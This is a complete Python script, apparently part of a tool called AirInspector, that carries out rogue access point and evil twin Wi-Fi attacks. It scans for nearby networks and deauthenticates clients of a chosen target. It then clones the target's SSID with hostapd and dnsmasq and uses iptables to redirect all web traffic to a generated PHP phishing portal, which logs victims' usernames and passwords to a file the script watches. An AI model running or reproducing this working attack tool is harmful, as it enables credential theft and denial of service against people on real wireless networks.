#!/usr/bin/env python3
import os
import sys
import subprocess
import signal
import time
import csv
import netifaces
from pathlib import Path
from typing import List, Dict, Optional


# ----------------- CONSTANTS -----------------
AP_IP = "192.168.1.1"
DHCP_RANGE_START = "192.168.1.2"
DHCP_RANGE_END = "192.168.1.30"
NETMASK = "255.255.255.0"
DNS_SERVER = "8.8.8.8"

SCRIPT_DIR = Path(__file__).resolve().parent


def check_root():
    if os.geteuid() != 0:
        print("[!] This script must be run as root. Exiting.")
        sys.exit(1)


def get_wireless_interfaces() -> list:
    wireless_ifaces = []
    try:
        for iface in netifaces.interfaces():
            wireless_path = f"/sys/class/net/{iface}/wireless"
            phy_path = f"/sys/class/net/{iface}/phy80211"
            
            if os.path.exists(wireless_path) or os.path.exists(phy_path):
                wireless_ifaces.append(iface)
            elif iface.startswith(('wlan', 'wlp', 'wlx', 'ath', 'ra', 'wifi')):
                wireless_ifaces.append(iface)
    except Exception:
        pass
    
    return wireless_ifaces


def choose_interface() -> str:
    wireless = get_wireless_interfaces()
    all_ifaces = netifaces.interfaces()
    all_ifaces = [i for i in all_ifaces if i != 'lo']
    
    print("\n" + "=" * 50)
    print(" Available Interfaces")
    print("=" * 50)
    
    if wireless:
        print("\n[Wireless Interfaces]")
        for i, iface in enumerate(wireless, 1):
            print(f"  {i}. {iface}")
    
    other = [i for i in all_ifaces if i not in wireless]
    if other:
        print("\n[Other Interfaces]")
        for i, iface in enumerate(other, len(wireless) + 1):
            print(f"  {i}. {iface}")
    
    print()
    
    combined = wireless + other
    
    if not combined:
        print("[!] No interfaces found!")
        return "wlan0"
    
    default = wireless[0] if wireless else combined[0]
    choice = input(f"Choose interface [{default}]: ").strip()
    
    if not choice:
        return default
    
    if choice.isdigit():
        idx = int(choice) - 1
        if 0 <= idx < len(combined):
            return combined[idx]
    
    if choice in combined:
        return choice
    
    print(f"[!] Invalid choice, using {default}")
    return default


# ----------------- SCANNING FUNCTIONS -----------------

def scan_networks(interface: str, duration: int = 10) -> Optional[Path]:
    out_prefix = SCRIPT_DIR / f"rogue_scan_{int(time.time())}"
    csv_path = Path(f"{out_prefix}-01.csv")
    
    cmd = ["airodump-ng", "--write", str(out_prefix), "--output-format", "csv", interface]
    
    print(f"[*] Scanning for networks ({duration} seconds)...")
    
    # Show progress dots
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        
        # Show progress while scanning
        for i in range(duration):
            dots = "." * ((i % 3) + 1)
            sys.stdout.write(f"\r[*] Scanning{dots.ljust(4)}")
            sys.stdout.flush()
            time.sleep(1)
        
        print("\r[*] Scan complete!    ")
        
        # Stop airodump
        try:
            os.killpg(proc.pid, signal.SIGTERM)
        except Exception:
            try:
                proc.terminate()
            except Exception:
                pass
        
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(proc.pid, signal.SIGKILL)
            except Exception:
                proc.kill()
            proc.wait()
            
    except FileNotFoundError:
        print("[!] airodump-ng not found. Is aircrack-ng installed?")
        return None
    except Exception as e:
        print(f"[!] Scan failed: {e}")
        return None
    
    return csv_path if csv_path.exists() else None


def parse_scan_results(csv_path: Path) -> List[Dict]:
    aps = []
    
    try:
        with open(csv_path, newline='', encoding='utf-8', errors='replace') as fh:
            reader = csv.reader(fh)
            rows = list(reader)
        
        # Find AP header row
        ap_header_idx = None
        for i, row in enumerate(rows):
            if row and any(cell.strip().lower() == 'bssid' for cell in row):
                ap_header_idx = i
                break
        
        if ap_header_idx is None:
            return []
        
        # Find station section (end of AP section)
        station_header_idx = None
        for j in range(ap_header_idx + 1, len(rows)):
            row = rows[j]
            if not row or all(cell.strip() == "" for cell in row):
                k = j + 1
                while k < len(rows) and (not rows[k] or all(cell.strip() == "" for cell in rows[k])):
                    k += 1
                if k < len(rows) and any("station" in (c.strip().lower()) for c in rows[k]):
                    station_header_idx = k
                break
        
        ap_columns = [c.strip() for c in rows[ap_header_idx]]
        ap_rows_end = station_header_idx - 1 if station_header_idx else len(rows)
        
        for r in rows[ap_header_idx + 1:ap_rows_end]:
            if not r or all(cell.strip() == "" for cell in r):
                continue
            
            data = {ap_columns[i]: r[i].strip() if i < len(r) else "" for i in range(len(ap_columns))}
            
            bssid = data.get("BSSID") or data.get("bssid")
            essid = data.get("ESSID") or data.get("essid") or ""
            channel = data.get("channel") or data.get("Channel") or ""
            power = data.get("Power") or data.get("PWR") or ""
            privacy = data.get("Privacy") or ""
            
            # Skip empty entries
            if not bssid or not essid or essid.strip() == "":
                continue
            
            # Clean up channel
            try:
                channel = str(int(channel.strip()))
            except:
                channel = "6"
            
            aps.append({
                "bssid": bssid.strip(),
                "essid": essid.strip(),
                "channel": channel,
                "power": power.strip(),
                "privacy": privacy.strip()
            })
        
    except Exception as e:
        print(f"[!] Failed to parse scan results: {e}")
        return []
    
    return aps


def cleanup_scan_files():
    for f in SCRIPT_DIR.glob("rogue_scan_*"):
        try:
            f.unlink()
        except:
            pass


def display_networks(aps: List[Dict]) -> Optional[Dict]:
    if not aps:
        print("[!] No networks found!")
        return None
    
    print("\n" + "=" * 70)
    print(" Found Wireless Networks")
    print("=" * 70)
    print(f"{'#':<4} {'ESSID':<25} {'BSSID':<18} {'CH':<4} {'PWR':<6} {'Security'}")
    print("-" * 70)
    
    for i, ap in enumerate(aps, 1):
        essid = ap['essid'][:24] if len(ap['essid']) > 24 else ap['essid']
        print(f"{i:<4} {essid:<25} {ap['bssid']:<18} {ap['channel']:<4} {ap['power']:<6} {ap['privacy']}")
    
    print("-" * 70)
    print(f"Found {len(aps)} network(s)")
    print()
    
    while True:
        try:
            choice = input(f"Select target network (1-{len(aps)}): ").strip()
            if not choice:
                continue
            
            idx = int(choice) - 1
            if 0 <= idx < len(aps):
                selected = aps[idx]
                print(f"\n[+] Selected: {selected['essid']} (Channel {selected['channel']})")
                return selected
            else:
                print(f"[!] Please enter a number between 1 and {len(aps)}")
        except ValueError:
            print("[!] Please enter a valid number")
        except KeyboardInterrupt:
            return None


def kill_interfering_processes():
    print("[*] Killing interfering processes...")
    subprocess.run(
        ["sudo", "airmon-ng", "check", "kill"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def generate_hostapd_config(interface: str, ssid: str, channel: str) -> str:
    return f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""


def generate_dnsmasq_config(interface: str) -> str:
    """Generate dnsmasq configuration content."""
    return f"""interface={interface}
dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{NETMASK},12h
dhcp-option=3,{AP_IP}
dhcp-option=6,{AP_IP}
server={DNS_SERVER}
log-queries
log-dhcp
listen-address={AP_IP}
address=/#/{AP_IP}
"""


def save_config_file(filepath: Path, content: str) -> bool:
    try:
        with open(filepath, 'w') as f:
            f.write(content)
        return True
    except Exception as e:
        print(f"[!] Failed to save config file {filepath}: {e}")
        return False


def setup_network_interface(interface: str) -> bool:
    print("[*] Configuring network interface...")
    
    try:
        # Set IP address on interface
        subprocess.run(
            f"ifconfig {interface} up {AP_IP} netmask {NETMASK}",
            shell=True, check=False
        )
        
        # Add route
        subprocess.run(
            f"route add -net 192.168.1.0 netmask {NETMASK} gw {AP_IP}",
            shell=True, check=False, stderr=subprocess.DEVNULL
        )
        
        return True
    except Exception as e:
        print(f"[!] Failed to configure interface: {e}")
        return False


def setup_captive_portal(interface: str):
    print("[*] Setting up captive portal redirect...")
    
    # Enable IP forwarding
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=False)
    
    # Flush existing rules
    subprocess.run("iptables -t nat -F", shell=True, check=False)
    subprocess.run("iptables -F", shell=True, check=False)
    
    # Allow established connections
    subprocess.run("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT", shell=True, check=False)
    
    # Allow traffic on our interface
    subprocess.run(f"iptables -A INPUT -i {interface} -j ACCEPT", shell=True, check=False)
    
    # Allow DHCP
    subprocess.run("iptables -A INPUT -p udp --dport 67:68 -j ACCEPT", shell=True, check=False)
    
    # Allow DNS
    subprocess.run("iptables -A INPUT -p udp --dport 53 -j ACCEPT", shell=True, check=False)
    subprocess.run("iptables -A INPUT -p tcp --dport 53 -j ACCEPT", shell=True, check=False)
    
    # Allow HTTP
    subprocess.run("iptables -A INPUT -p tcp --dport 80 -j ACCEPT", shell=True, check=False)
    
    # Redirect all HTTP traffic to our captive portal
    subprocess.run(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:80",
        shell=True, check=False
    )
    
    # Redirect HTTPS to HTTP (some devices check HTTPS)
    subprocess.run(
        f"iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j DNAT --to-destination {AP_IP}:80",
        shell=True, check=False
    )
    
    # Masquerade for NAT
    subprocess.run("iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True, check=False)
    
    print("[+] Captive portal rules configured")


def cleanup_iptables():
    print("[*] Cleaning up iptables rules...")
    subprocess.run("iptables -t nat -F", shell=True, check=False, 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("iptables -F", shell=True, check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True, check=False)


def start_hostapd(config_path: Path):
    print("[*] Starting Hostapd...")
    subprocess.Popen(
        f"xterm -hold -e sudo hostapd {config_path} &",
        shell=True
    )
    time.sleep(2)


def start_dnsmasq(config_path: Path):
    print("[*] Stopping existing dnsmasq...")
    # Stop system dnsmasq service
    subprocess.run("systemctl stop dnsmasq", shell=True, check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Kill any running dnsmasq processes
    subprocess.run("killall dnsmasq", shell=True, check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)
    
    print("[*] Starting Dnsmasq...")
    subprocess.Popen(
        f"xterm -hold -e sudo dnsmasq -C {config_path} -d &",
        shell=True
    )
    time.sleep(2)


def start_php_server(template_dir: str):
    print("[*] Starting PHP Server...")
    template_path = SCRIPT_DIR / template_dir
    
    if not template_path.exists():
        print(f"[!] Template directory not found: {template_path}")
        print("[*] Creating basic template...")
        template_path.mkdir(parents=True, exist_ok=True)
        
        index_php = template_path / "index.php"
        index_php.write_text("""<?php
echo "<h1>Captive Portal</h1>";
echo "<form method='POST' action='capture.php'>";
echo "<input type='text' name='username' placeholder='Username'><br>";
echo "<input type='password' name='password' placeholder='Password'><br>";
echo "<input type='submit' value='Login'>";
echo "</form>";
?>""")
        
        capture_php = template_path / "capture.php"
        capture_php.write_text("""<?php
$file = fopen("credentials.txt", "a");
fwrite($file, "Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\\n");
fclose($file);
echo "<h1>Connection Error</h1><p>Please try again later.</p>";
?>""")
    
    # Listen on 0.0.0.0 so all clients can connect
    subprocess.Popen(
        f"cd {template_path} && xterm -hold -e sudo php -S 0.0.0.0:80 &",
        shell=True
    )
    time.sleep(3)
    print(f"[+] PHP Server listening on 0.0.0.0:80")


def start_deauth_attack(interface: str, target_ssid: str):
    print(f"[*] Starting deauth attack against: {target_ssid}")
    subprocess.Popen(
        f"xterm -hold -e aireplay-ng -0 0 -e '{target_ssid}' -c FF:FF:FF:FF:FF:FF {interface} &",
        shell=True
    )


def watch_credentials(attack_type: str):
    import select
    import sys
    
    if attack_type == "new":
        cred_file = SCRIPT_DIR / "ETwin-templates" / "login-temp" / "credentials.txt"
    else:
        cred_file = SCRIPT_DIR / "ETwin-templates" / "firmware-upgrade" / "credentials.txt"
    
    print("[*] Waiting for credentials... (Press Enter to stop)")
    
    try:
        last_size = 0
        while True:
            if cred_file.exists():
                current_size = cred_file.stat().st_size
                if current_size > last_size:
                    with open(cred_file, 'r') as f:
                        f.seek(last_size)
                        new_creds = f.read()
                        if new_creds.strip():
                            print("\n[+] NEW CREDENTIALS CAPTURED:")
                            print(new_creds)
                    last_size = current_size
            
            # Check if Enter was pressed (non-blocking)
            if select.select([sys.stdin], [], [], 0)[0]:
                sys.stdin.readline()
                print("\n[*] Stopping credential capture...")
                break
            
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Stopping credential capture...")


def kill_xterm_processes():
    print("[*] Stopping services...")
    try:
        result = subprocess.run(['ps', '-A'], capture_output=True)
        for line in result.stdout.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                try:
                    os.kill(pid, signal.SIGKILL)
                except ProcessLookupError:
                    pass
    except Exception as e:
        print(f"[!] Error killing processes: {e}")


def cleanup(interface: str):
    kill_xterm_processes()
    
    # Clean up iptables rules
    cleanup_iptables()
    
    config_files = [
        SCRIPT_DIR / "wifi_hostapd.conf",
        SCRIPT_DIR / "wifi_dnsmasq.conf"
    ]
    
    print("[*] Removing temporary config files...")
    for f in config_files:
        try:
            if f.exists():
                f.unlink()
        except Exception:
            pass
    
    print("[*] Restoring network services...")
    subprocess.run(
        ["sudo", "systemctl", "start", "NetworkManager"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def show_menu():
    print("\n" + "=" * 50)
    print(" Rogue AP Attack")
    print("=" * 50)
    print("1. Create a new access point")
    print("2. Duplicate an existing access point (Evil Twin)")
    print("3. Exit")


def create_new_ap(interface: str):
    print("\n[MODE 1] Creating New Access Point\n")
    
    ssid = input("Access point name (SSID): ").strip()
    if not ssid:
        print("[!] SSID cannot be empty!")
        return
    
    channel = input("Channel number (1-11) [6]: ").strip()
    if not channel:
        channel = "6"
    elif not channel.isdigit() or not (1 <= int(channel) <= 11):
        print("[!] Invalid channel! Using channel 6.")
        channel = "6"
    
    kill_interfering_processes()
    
    print("[*] Configuring files...")
    
    hostapd_config = generate_hostapd_config(interface, ssid, channel)
    hostapd_path = SCRIPT_DIR / "wifi_hostapd.conf"
    if not save_config_file(hostapd_path, hostapd_config):
        return
    
    dnsmasq_config = generate_dnsmasq_config(interface)
    dnsmasq_path = SCRIPT_DIR / "wifi_dnsmasq.conf"
    if not save_config_file(dnsmasq_path, dnsmasq_config):
        return
    
    if not setup_network_interface(interface):
        return
    
    # Setup captive portal redirect
    setup_captive_portal(interface)
    
    start_hostapd(hostapd_path)
    start_dnsmasq(dnsmasq_path)
    start_php_server("ETwin-templates/login-temp")
    
    print("\n[!] Press Ctrl+C to stop the attack")
    
    watch_credentials("new")
    
    cleanup(interface)
    print("[*] Log data saved in ETwin-templates/login-temp folder")
    print("[+] Attack completed successfully!")


def duplicate_ap(interface: str):
    """Duplicate an existing access point (Evil Twin attack)."""
    print("\n[MODE 2] Duplicating Existing Access Point (Evil Twin)\n")
    
    kill_interfering_processes()
    
    # Scan for networks
    csv_path = scan_networks(interface, duration=10)
    
    if not csv_path:
        print("[!] Scan failed. Make sure interface is in monitor mode.")
        return
    
    # Parse results
    aps = parse_scan_results(csv_path)
    cleanup_scan_files()
    
    if not aps:
        print("[!] No networks found. Try again or check your interface.")
        return
    
    # Let user choose target
    target = display_networks(aps)
    
    if not target:
        print("[!] No network selected.")
        return
    
    ssid = target['essid']
    channel = target['channel']
    bssid = target['bssid']
    
    print(f"\n[*] Target: {ssid}")
    print(f"[*] BSSID: {bssid}")
    print(f"[*] Channel: {channel}")
    
    print("\n[*] Setting up Evil Twin attack...")
    
    # Start deauth attack
    start_deauth_attack(interface, ssid)
    
    time.sleep(2)
    os.system("clear")
    print("\n" + "=" * 50)
    print(" Evil Twin Attack Active")
    print("=" * 50)
    print(f"\n[*] Target Network: {ssid}")
    print(f"[*] Sending deauthentication packets...\n")
    
    print("[*] Duplicating access point...")
    
    hostapd_config = generate_hostapd_config(interface, ssid, channel)
    hostapd_path = SCRIPT_DIR / "wifi_hostapd.conf"
    if not save_config_file(hostapd_path, hostapd_config):
        return
    
    dnsmasq_config = generate_dnsmasq_config(interface)
    dnsmasq_path = SCRIPT_DIR / "wifi_dnsmasq.conf"
    if not save_config_file(dnsmasq_path, dnsmasq_config):
        return
    
    if not setup_network_interface(interface):
        return
    
    # Setup captive portal redirect
    setup_captive_portal(interface)
    
    start_hostapd(hostapd_path)
    start_dnsmasq(dnsmasq_path)
    start_php_server("ETwin-templates/firmware-upgrade")
    
    print("\n[!] Press Ctrl+C to stop the attack")
    
    watch_credentials("duplicate")
    
    cleanup(interface)
    print("[*] Log data saved in ETwin-templates/firmware-upgrade folder")
    print("[+] Attack completed successfully!")


def main():
    """Main entry point."""
    os.system("clear")
    print("\n" + "=" * 50)
    print(" ROGUE ACCESS POINT ATTACK")
    print(" AirInspector Module")
    print("=" * 50)
    
    check_root()
    
    interface = choose_interface()
    print(f"\n[*] Using interface: {interface}")
    
    show_menu()
    
    while True:
        choice = input("\nSelect option (1-3): ").strip()
        
        if choice == '3':
            print("Exiting...")
            sys.exit(0)
        elif choice == '1':
            try:
                create_new_ap(interface)
            except KeyboardInterrupt:
                print("\n[*] Attack interrupted by user.")
                cleanup(interface)
            break
        elif choice == '2':
            try:
                duplicate_ap(interface)
            except KeyboardInterrupt:
                print("\n[*] Attack interrupted by user.")
                cleanup(interface)
            break
        else:
            print("[!] Invalid option. Please choose 1, 2, or 3.")


if __name__ == "__main__":
    main()